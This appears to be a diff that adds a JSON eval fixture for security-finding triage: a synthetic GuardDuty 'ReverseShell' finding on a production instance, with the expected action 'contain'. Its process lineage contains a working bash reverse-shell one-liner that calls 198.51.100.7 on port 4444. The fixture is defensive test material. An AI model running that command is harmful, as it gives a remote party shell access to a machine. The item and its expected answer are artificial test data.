@@ -1,0 +1,56 @@
+{
+  "id": "malicious-reverse-shell",
+  "label": "malicious",
+  "expected_recommended_action": "contain",
+  "notes": "Runtime Monitoring saw a reverse shell. Established sessions survive an SG swap.",
+  "injection_vector": null,
+  "finding": {
+    "SchemaVersion": "2.0",
+    "Id": "eval-malicious-reverse-shell",
+    "Type": "Execution:Runtime/ReverseShell",
+    "Severity": 8.0,
+    "AccountId": "123456789012",
+    "Region": "us-east-1",
+    "Partition": "aws",
+    "Title": "Eval case malicious-reverse-shell",
+    "Description": "Synthetic finding for eval case malicious-reverse-shell.",
+    "CreatedAt": "2026-09-21T12:00:00.000Z",
+    "UpdatedAt": "2026-09-21T12:00:00.000Z",
+    "Arn": "arn:aws:guardduty:us-east-1:123456789012:detector/example/finding/eval-malicious-reverse-shell",
+    "Resource": {
+      "ResourceType": "Instance",
+      "InstanceDetails": {
+        "InstanceId": "i-0123456789abcdef0",
+        "Tags": [
+          {
+            "Key": "Environment",
+            "Value": "Production"
+          }
+        ]
+      }
+    },
+    "Service": {
+      "Archived": false,
+      "DetectorId": "example",
+      "ResourceRole": "ACTOR",
+      "Count": 1,
+      "RuntimeDetails": {
+        "Process": {
+          "Name": "sh",
+          "ExecutablePath": "/bin/sh",
+          "Lineage": [
+            {
+              "Name": "/bin/sh"
+            },
+            {
+              "Name": "-i"
+            },
+            {
+              "Name": "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"
+            }
+          ]
+        }
+      }
+    }
+  }
+}
